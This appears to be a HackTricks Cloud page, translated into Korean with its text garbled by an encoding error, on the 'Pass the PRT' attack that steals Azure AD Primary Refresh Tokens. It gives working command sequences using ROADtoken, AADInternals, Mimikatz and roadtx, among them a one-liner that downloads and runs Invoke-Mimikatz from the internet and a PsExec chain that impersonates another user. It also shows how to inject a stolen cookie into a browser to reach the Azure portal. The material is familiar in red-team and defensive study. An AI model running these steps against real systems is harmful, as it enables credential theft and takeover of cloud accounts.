# Az - Pass the PRT

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## PRTë€ ë¬´ì—‡ì¸ê°€

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### PRTê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê¸°
```
Dsregcmd.exe /status
```
SSO State ì„¹ì…˜ì—ì„œ **`AzureAdPrt`**ê°€ **YES**ë¡œ ì„¤ì •ëœ ê²ƒì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

ê°™ì€ ì¶œë ¥ì—ì„œ **ì¥ì¹˜ê°€ Azureì— ê°€ì…ë˜ì—ˆëŠ”ì§€** (`AzureAdJoined` í•„ë“œì—ì„œ)ë„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookieëŠ” ì‹¤ì œë¡œ **`x-ms-RefreshTokenCredential`**ì´ë¼ê³  ë¶ˆë¦¬ë©°, JSON Web Token (JWT)ì…ë‹ˆë‹¤. JWTëŠ” **í—¤ë”**, **í˜ì´ë¡œë“œ**, **ì„œëª…**ì˜ **3ë¶€ë¶„**ìœ¼ë¡œ êµ¬ì„±ë˜ë©°, `.`ë¡œ êµ¬ë¶„ë˜ê³  ëª¨ë‘ URL-ì•ˆì „í•œ base64ë¡œ ì¸ì½”ë”©ë©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ PRT cookieëŠ” ë‹¤ìŒê³¼ ê°™ì€ í—¤ë”ì™€ ë³¸ë¬¸ì„ í¬í•¨í•©ë‹ˆë‹¤:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
ì‹¤ì œ **Primary Refresh Token (PRT)**ëŠ” **`refresh_token`** ë‚´ì— ìº¡ìŠí™”ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” Azure ADì˜ ì œì–´ í•˜ì— ìˆëŠ” í‚¤ë¡œ ì•”í˜¸í™”ë˜ì–´ ìˆì–´ ê·¸ ë‚´ìš©ì„ ìš°ë¦¬ê°€ í•´ë…í•  ìˆ˜ ì—†ê²Œ ë§Œë“­ë‹ˆë‹¤. **`is_primary`** í•„ë“œëŠ” ì´ í† í° ë‚´ì— ê¸°ë³¸ ìƒˆë¡œ ê³ ì¹¨ í† í°ì´ ìº¡ìŠí™”ë˜ì–´ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì¿ í‚¤ê°€ ì˜ë„ëœ íŠ¹ì • ë¡œê·¸ì¸ ì„¸ì…˜ì— ë¬¶ì—¬ ìˆë„ë¡ í•˜ê¸° ìœ„í•´ `request_nonce`ëŠ” `logon.microsoftonline.com` í˜ì´ì§€ì—ì„œ ì „ì†¡ë©ë‹ˆë‹¤.

### TPMì„ ì‚¬ìš©í•œ PRT ì¿ í‚¤ íë¦„

**LSASS** í”„ë¡œì„¸ìŠ¤ëŠ” **KDF ì»¨í…ìŠ¤íŠ¸**ë¥¼ TPMì— ì „ì†¡í•˜ë©°, TPMì€ **ì„¸ì…˜ í‚¤**(ì¥ì¹˜ê°€ AzureADì— ë“±ë¡ë  ë•Œ ìˆ˜ì§‘ë˜ì–´ TPMì— ì €ì¥ë¨)ì™€ ì´ì „ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **í‚¤ë¥¼ íŒŒìƒ**í•˜ê³ , ì´ **íŒŒìƒëœ í‚¤**ëŠ” **PRT ì¿ í‚¤(JWT)**ë¥¼ ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

**KDF ì»¨í…ìŠ¤íŠ¸ëŠ”** AzureADì˜ nonceì™€ PRTê°€ **ì»¨í…ìŠ¤íŠ¸**(ëœë¤ ë°”ì´íŠ¸)ì™€ í˜¼í•©ëœ **JWT**ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ PRTê°€ TPM ë‚´ë¶€ì— ìˆì–´ ì¶”ì¶œí•  ìˆ˜ ì—†ë”ë¼ë„, LSASSë¥¼ ì•…ìš©í•˜ì—¬ **ìƒˆë¡œìš´ ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŒŒìƒëœ í‚¤ë¥¼ ìš”ì²­í•˜ê³  ìƒì„±ëœ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿ í‚¤ë¥¼ ì„œëª…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT ì•…ìš© ì‹œë‚˜ë¦¬ì˜¤

**ì¼ë°˜ ì‚¬ìš©ì**ë¡œì„œ **SSO ë°ì´í„°ë¥¼ ìš”ì²­**í•˜ì—¬ LSASSì— PRT ì‚¬ìš©ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” **Web Account Manager**(í† í° ë¸Œë¡œì»¤)ì—ì„œ í† í°ì„ ìš”ì²­í•˜ëŠ” **ë„¤ì´í‹°ë¸Œ ì•±**ì²˜ëŸ¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. WAMì€ ìš”ì²­ì„ **LSASS**ì— ì „ë‹¬í•˜ë©°, LSASSëŠ” ì„œëª…ëœ PRT ì£¼ì¥ì„ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìš”ì²­í•©ë‹ˆë‹¤. ë˜ëŠ” **ë¸Œë¼ìš°ì € ê¸°ë°˜(ì›¹) íë¦„**ì—ì„œ **PRT ì¿ í‚¤**ë¥¼ **í—¤ë”**ë¡œ ì‚¬ìš©í•˜ì—¬ Azure AS ë¡œê·¸ì¸ í˜ì´ì§€ì— ìš”ì²­ì„ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**SYSTEM**ìœ¼ë¡œì„œ TPMì— ì˜í•´ ë³´í˜¸ë˜ì§€ ì•ŠëŠ” ê²½ìš° PRTë¥¼ **íƒˆì·¨**í•˜ê±°ë‚˜ **LSASSì˜ PRT í‚¤ì™€ ìƒí˜¸ì‘ìš©**í•˜ì—¬ ì•”í˜¸í™” APIë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Pass-the-PRT ê³µê²© ì˜ˆì‹œ

### ê³µê²© - ROADtoken

ì´ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ì´ ê²Œì‹œë¬¼**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤. ROADtokenì€ ì˜¬ë°”ë¥¸ ë””ë ‰í† ë¦¬ì—ì„œ **`BrowserCore.exe`**ë¥¼ ì‹¤í–‰í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **PRT ì¿ í‚¤ë¥¼ íšë“**í•©ë‹ˆë‹¤. ì´ ì¿ í‚¤ëŠ” ì´í›„ ROADtoolsë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦í•˜ê³  **ì§€ì†ì ì¸ ìƒˆë¡œ ê³ ì¹¨ í† í°ì„ íšë“**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìœ íš¨í•œ PRT ì¿ í‚¤ë¥¼ ìƒì„±í•˜ë ¤ë©´ ë¨¼ì € nonceê°€ í•„ìš”í•©ë‹ˆë‹¤.\
ë‹¤ìŒê³¼ ê°™ì´ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
ë˜ëŠ” [**roadrecon**](https://github.com/dirkjanm/ROADtools)ë¥¼ ì‚¬ìš©í•˜ì—¬:
```powershell
roadrecon auth prt-init
```
ê·¸ëŸ° ë‹¤ìŒ [**roadtoken**](https://github.com/dirkjanm/ROADtoken)ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ PRTë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê³µê²©í•  ì‚¬ìš©ìì˜ í”„ë¡œì„¸ìŠ¤ì—ì„œ ë„êµ¬ë¥¼ ì‹¤í–‰):
```powershell
.\ROADtoken.exe <nonce>
```
í•œ ì¤„ë¡œ:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ê·¸ëŸ° ë‹¤ìŒ **ìƒì„±ëœ ì¿ í‚¤**ë¥¼ ì‚¬ìš©í•˜ì—¬ Azure AD **Graph** ë˜ëŠ” Microsoft Graphë¥¼ ì‚¬ìš©í•˜ì—¬ **ë¡œê·¸ì¸**í•  **í† í°ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Attack - Using roadrecon

### Attack - Using AADInternals and a leaked PRT

`Get-AADIntUserPRTToken` **ì‚¬ìš©ìì˜ PRT í† í°ì„ ê°€ì ¸ì˜µë‹ˆë‹¤** Azure ADì— ê°€ì…ë˜ì—ˆê±°ë‚˜ Hybridì— ê°€ì…ëœ ì»´í“¨í„°ì—ì„œ. `BrowserCore.exe`ë¥¼ ì‚¬ìš©í•˜ì—¬ PRT í† í°ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
ë˜ëŠ” Mimikatzì—ì„œ ê°’ì„ ì–»ì€ ê²½ìš° AADInternalsë¥¼ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com)ìœ¼ë¡œ ì´ë™í•˜ì—¬ login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆ ì¿ í‚¤ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ê·¸ëŸ° ë‹¤ìŒ [https://portal.azure.com](https://portal.azure.com)ìœ¼ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ê°’ì´ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹˜ê³  ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì‚¬ë¼ì§€ë©´ ì‹¤ìˆ˜ë¥¼ í–ˆì„ ìˆ˜ ìˆìœ¼ë©° ê³¼ì •ì„ ë‹¤ì‹œ ê±°ì³ì•¼ í•©ë‹ˆë‹¤. ì‚¬ë¼ì§€ì§€ ì•Šìœ¼ë©´ ê´œì°®ìŠµë‹ˆë‹¤.
{% endhint %}

### Attack - Mimikatz

#### Steps

1. **PRT (Primary Refresh Token)ì´ LSASS** (Local Security Authority Subsystem Service)ì—ì„œ ì¶”ì¶œë˜ì–´ ì´í›„ ì‚¬ìš©ì„ ìœ„í•´ ì €ì¥ë©ë‹ˆë‹¤.
2. **ë‹¤ìŒìœ¼ë¡œ ì„¸ì…˜ í‚¤ê°€ ì¶”ì¶œë©ë‹ˆë‹¤**. ì´ í‚¤ëŠ” ì²˜ìŒ ë°œê¸‰ëœ í›„ ë¡œì»¬ ì¥ì¹˜ì— ì˜í•´ ë‹¤ì‹œ ì•”í˜¸í™”ë˜ë¯€ë¡œ DPAPI ë§ˆìŠ¤í„°í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•´ì•¼ í•©ë‹ˆë‹¤. DPAPI (Data Protection API)ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ê·¸ ì ìš©ì— ëŒ€í•œ ì´í•´ëŠ” [Pass-the-cookie attack](az-pass-the-cookie.md)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.
3. ì„¸ì…˜ í‚¤ë¥¼ ë³µí˜¸í™”í•œ í›„, **PRTì˜ íŒŒìƒ í‚¤ì™€ ì»¨í…ìŠ¤íŠ¸ê°€ ì–»ì–´ì§‘ë‹ˆë‹¤**. ì´ëŠ” **PRT ì¿ í‚¤ ìƒì„±**ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤. íŠ¹íˆ, íŒŒìƒ í‚¤ëŠ” ì¿ í‚¤ë¥¼ êµ¬ì„±í•˜ëŠ” JWT (JSON Web Token)ë¥¼ ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê³¼ì •ì— ëŒ€í•œ í¬ê´„ì ì¸ ì„¤ëª…ì€ Dirk-janì´ ì œê³µí•œ [ì—¬ê¸°](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
PRTê°€ TPM ë‚´ë¶€ì— ìˆê³  `lsass` ë‚´ë¶€ì— ìˆì§€ ì•Šìœ¼ë©´ **mimikatzê°€ ì´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.\
ê·¸ëŸ¬ë‚˜ TPMì—ì„œ ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŒŒìƒ í‚¤ë¥¼ ì–»ì–´ ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì¿ í‚¤ì— ì„œëª…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜µì…˜ 3ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤).**
{% endhint %}

ì´ ì„¸ë¶€ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ê¸° ìœ„í•´ ìˆ˜í–‰ëœ **ê³¼ì •ì— ëŒ€í•œ ì‹¬ì¸µ ì„¤ëª…**ì€ [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
2021ë…„ 8ì›” ì´í›„ ìˆ˜ì • ì‚¬í•­ìœ¼ë¡œ ì¸í•´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRT í† í°ì„ ì–»ëŠ” ê²ƒì€ ì •í™•íˆ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ìì‹ ì˜ PRTë§Œ ì–»ì„ ìˆ˜ ìˆìœ¼ë©°, ë¡œì»¬ ê´€ë¦¬ìëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRTì— ì ‘ê·¼í•  ìˆ˜ ì—†ì§€ë§Œ ìì‹ ì˜ PRTì—ëŠ” ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

**mimikatz**ë¥¼ ì‚¬ìš©í•˜ì—¬ PRTë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Prt**ë¡œ í‘œì‹œëœ ë¶€ë¶„ì„ **ë³µì‚¬**í•˜ì—¬ ì €ì¥í•©ë‹ˆë‹¤.\
ì•„ë˜ ê°•ì¡° í‘œì‹œëœ ì„¸ì…˜ í‚¤(**`ProofOfPossesionKey`** í•„ë“œì˜ **`KeyValue`**)ë„ ì¶”ì¶œí•©ë‹ˆë‹¤. ì´ê²ƒì€ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, ì´ë¥¼ í•´ë…í•˜ê¸° ìœ„í•´ DPAPI ë§ˆìŠ¤í„° í‚¤ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PRT ë°ì´í„°ë¥¼ ë³¼ ìˆ˜ ì—†ëŠ” ê²½ìš°, **ê¸°ê¸°ê°€ Azure ADì— ê°€ì…ë˜ì§€ ì•Šì•˜ê±°ë‚˜** Windows 10ì˜ **êµ¬ë²„ì „ì„ ì‹¤í–‰ ì¤‘**ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì„¸ì…˜ í‚¤ë¥¼ **í•´ë…**í•˜ë ¤ë©´ **SYSTEM** ê¶Œí•œìœ¼ë¡œ **ê¶Œí•œì„ ìƒìŠ¹**ì‹œì¼œ ì»´í“¨í„° ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰í•˜ì—¬ **DPAPI ë§ˆìŠ¤í„° í‚¤ë¥¼ ì‚¬ìš©í•´ í•´ë…**í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 1 - Full Mimikatz

* ì´ì œ Context ê°’ì„ ë³µì‚¬í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* ê·¸ë¦¬ê³  derived key ê°’ì„ ë³µì‚¬í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* ë§ˆì§€ë§‰ìœ¼ë¡œ ì´ ëª¨ë“  ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ **PRT ì¿ í‚¤ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* [https://login.microsoftonline.com](https://login.microsoftonline.com)ìœ¼ë¡œ ì´ë™í•˜ì—¬ login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆ ì¿ í‚¤ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* [https://portal.azure.com](https://portal.azure.com)ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ê°’ì´ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹¨í•  ìˆ˜ ìˆê³  ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì‚¬ë¼ì§€ë©´ ì‹¤ìˆ˜í–ˆì„ ìˆ˜ ìˆìœ¼ë©° ê³¼ì •ì„ ë‹¤ì‹œ ê±°ì³ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ë¼ì§€ì§€ ì•Šìœ¼ë©´ ê´œì°®ìŠµë‹ˆë‹¤.
{% endhint %}

#### ì˜µì…˜ 2 - PRTë¥¼ ì‚¬ìš©í•œ roadrecon

* ë¨¼ì € PRTë¥¼ ê°±ì‹ í•˜ì—¬ `roadtx.prt`ì— ì €ì¥í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* ì´ì œ `roadtx browserprtauth`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸í„°ë™í‹°ë¸Œ ë¸Œë¼ìš°ì €ë¡œ **í† í°ì„ ìš”ì²­**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `roadtx describe` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ë©´, ì´ ê²½ìš° ì‚¬ìš©í•œ PRTì—ë„ MFA í´ë ˆì„ì´ í¬í•¨ë˜ì–´ ìˆì—ˆê¸° ë•Œë¬¸ì— ì•¡ì„¸ìŠ¤ í† í°ì— MFA í´ë ˆì„ì´ í¬í•¨ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 3 - derived keysë¥¼ ì‚¬ìš©í•œ roadrecon

mimikatzì— ì˜í•´ ë¤í”„ëœ ì»¨í…ìŠ¤íŠ¸ì™€ derived keyë¥¼ ê°€ì§€ê³ , roadreconì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## References

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”:** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œ.

</details>
{% endhint %}
